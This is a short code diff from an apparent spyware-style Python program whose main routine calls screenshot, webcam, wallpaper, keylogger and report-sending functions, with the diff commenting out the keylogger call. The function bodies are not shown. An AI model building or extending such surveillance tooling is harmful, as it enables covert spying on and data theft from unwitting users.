@@ -226,7 +226,7 @@ def main():
     screenshots()
     web_camera()
     set_wallpaper()
-    keys_logger()
+    # keys_logger()
     send_report()
     os.system("exit")
 
